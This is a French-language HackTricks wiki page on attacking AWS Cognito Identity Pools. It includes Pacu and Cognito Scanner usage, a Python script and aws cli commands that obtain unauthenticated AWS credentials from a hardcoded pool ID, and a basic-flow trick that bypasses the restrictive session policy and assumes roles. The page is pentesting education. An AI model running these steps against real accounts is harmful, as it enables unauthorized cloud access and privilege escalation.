# Cognito Identity Pools

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Les pools d'identit√© jouent un r√¥le crucial en permettant √† vos utilisateurs d'**acqu√©rir des identifiants temporaires**. Ces identifiants sont essentiels pour acc√©der √† divers services AWS, y compris, mais sans s'y limiter, Amazon S3 et DynamoDB. Une caract√©ristique notable des pools d'identit√© est leur support pour les utilisateurs invit√©s anonymes et une gamme de fournisseurs d'identit√© pour l'authentification des utilisateurs. Les fournisseurs d'identit√© pris en charge incluent :

* Amazon Cognito user pools
* Options de connexion sociale telles que Facebook, Google, Login with Amazon, et Sign in with Apple
* Fournisseurs conformes √† OpenID Connect (OIDC)
* Fournisseurs d'identit√© SAML (Security Assertion Markup Language)
* Identit√©s authentifi√©es par le d√©veloppeur
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Pour g√©n√©rer des sessions de Identity Pool, vous devez d'abord **g√©n√©rer un Identity ID**. Cet Identity ID est **l'identification de la session de cet utilisateur**. Ces identifications peuvent avoir jusqu'√† 20 ensembles de donn√©es pouvant stocker jusqu'√† 1 Mo de paires cl√©-valeur.

Ceci est **utile pour garder des informations sur un utilisateur** (qui utilisera toujours le m√™me Identity ID).

De plus, le service **cognito-sync** est le service qui permet de **g√©rer et synchroniser ces informations** (dans les ensembles de donn√©es, en envoyant des informations dans des flux et des messages SNS...).

### Tools for pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), le framework d'exploitation AWS, inclut maintenant les modules "cognito\_\_enum" et "cognito\_\_attack" qui automatisent l'√©num√©ration de tous les actifs Cognito dans un compte et signalent les configurations faibles, les attributs utilisateur utilis√©s pour le contr√¥le d'acc√®s, etc., et automatisent √©galement la cr√©ation d'utilisateurs (y compris le support MFA) et l'escalade de privil√®ges bas√©e sur des attributs personnalisables modifiables, des identifiants de pool d'identit√© utilisables, des r√¥les assumables dans des jetons d'identit√©, etc.

Pour une description des fonctions des modules, voir la partie 2 du [blog post](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Pour des instructions d'installation, voir la page principale de [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Usage

Exemple d'utilisation de cognito\_\_attack pour tenter la cr√©ation d'utilisateur et tous les vecteurs d'escalade de privil√®ges contre un pool d'identit√© et un client de pool d'utilisateurs donn√©s :
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Exemple d'utilisation de cognito\_\_enum pour rassembler tous les groupes d'utilisateurs, les clients de groupes d'utilisateurs, les pools d'identit√©, les utilisateurs, etc. visibles dans le compte AWS actuel :
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) est un outil CLI en python qui impl√©mente diff√©rentes attaques sur Cognito, y compris la cr√©ation de comptes non d√©sir√©s et l'escalade de pools d'identit√©.

#### Installation
```bash
$ pip install cognito-scanner
```
#### Utilisation
```bash
$ cognito-scanner --help
```
Pour plus d'informations, consultez https://github.com/padok-team/cognito-scanner

## Acc√©der aux r√¥les IAM

### Non authentifi√©

La seule chose qu'un attaquant doit savoir pour **obtenir des identifiants AWS** dans une application Cognito en tant qu'utilisateur non authentifi√© est le **ID de la piscine d'identit√©**, et cet **ID doit √™tre cod√© en dur** dans l'**application** web/mobile pour qu'elle puisse l'utiliser. Un ID ressemble √† ceci : `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (il n'est pas bruteforcable).

{% hint style="success" %}
Le **r√¥le IAM Cognito non authentifi√© cr√©√© via est appel√©** par d√©faut `Cognito_<Nom de la piscine d'identit√©>Unauth_Role`
{% endhint %}

Si vous trouvez un ID de piscine d'identit√© cod√© en dur et qu'il permet aux utilisateurs non authentifi√©s, vous pouvez obtenir des identifiants AWS avec :
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ou vous pourriez utiliser les **commandes aws cli** suivantes :
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Notez qu'en d√©faut, un utilisateur cognito **non authentifi√© NE PEUT avoir aucune permission, m√™me si elle a √©t√© assign√©e via une politique**. Consultez la section suivante.
{% endhint %}

### Flux d'authentification am√©lior√© vs basique

La section pr√©c√©dente a suivi le **flux d'authentification am√©lior√© par d√©faut**. Ce flux d√©finit une **politique de session** [**restrictive**](../../aws-basic-information/#session-policies) pour la session de r√¥le IAM g√©n√©r√©e. Cette politique ne permettra √† la session que [**d'utiliser les services de cette liste**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (m√™me si le r√¥le avait acc√®s √† d'autres services).

Cependant, il existe un moyen de contourner cela, si le **pool d'identit√© a "Flux basique (classique)" activ√©**, l'utilisateur pourra obtenir une session en utilisant ce flux qui **n'aura pas cette politique de session restrictive**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Si vous recevez cette **erreur**, c'est parce que le **flux de base n'est pas activ√© (par d√©faut)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Ayant un ensemble de credentials IAM, vous devriez v√©rifier [quels acc√®s vous avez](../../#whoami) et essayer d'[escalader les privil√®ges](../../aws-privilege-escalation/).

### Authentifi√©

{% hint style="info" %}
N'oubliez pas que les **utilisateurs authentifi√©s** se verront probablement accorder **des permissions diff√©rentes**, donc si vous pouvez **vous inscrire dans l'application**, essayez de le faire et obtenez les nouveaux credentials.
{% endhint %}

Il pourrait √©galement y avoir des **r√¥les** disponibles pour les **utilisateurs authentifi√©s acc√©dant au Identity Pool**.

Pour cela, vous pourriez avoir besoin d'acc√©der au **fournisseur d'identit√©**. Si c'est un **Cognito User Pool**, peut-√™tre pouvez-vous abuser du comportement par d√©faut et **cr√©er un nouvel utilisateur vous-m√™me**.

{% hint style="success" %}
Le **r√¥le authentifi√© IAM Cognito cr√©√© via** s'appelle par d√©faut `Cognito_<Nom du Identity Pool>Auth_Role`
{% endhint %}

Quoi qu'il en soit, le **suivant exemple** suppose que vous √™tes d√©j√† connect√© √† un **Cognito User Pool** utilis√© pour acc√©der au Identity Pool (n'oubliez pas que d'autres types de fournisseurs d'identit√© pourraient √©galement √™tre configur√©s).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Obtenez l'identity_id de la r√©ponse de la commande pr√©c√©dente
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# Dans l'IdToken, vous pouvez trouver les r√¥les auxquels un utilisateur a acc√®s en raison des groupes de User Pool
# Utilisez le --custom-role-arn pour obtenir des credentials pour un r√¥le sp√©cifique
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Il est possible de **configurer diff√©rents r√¥les IAM en fonction du fournisseur d'identit√©** avec lequel l'utilisateur est connect√© ou m√™me simplement en fonction **de l'utilisateur** (en utilisant des claims). Par cons√©quent, si vous avez acc√®s √† diff√©rents utilisateurs via le m√™me ou diff√©rents fournisseurs, cela pourrait **valoir le coup de se connecter et d'acc√©der aux r√¥les IAM de tous**.
{% endhint %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
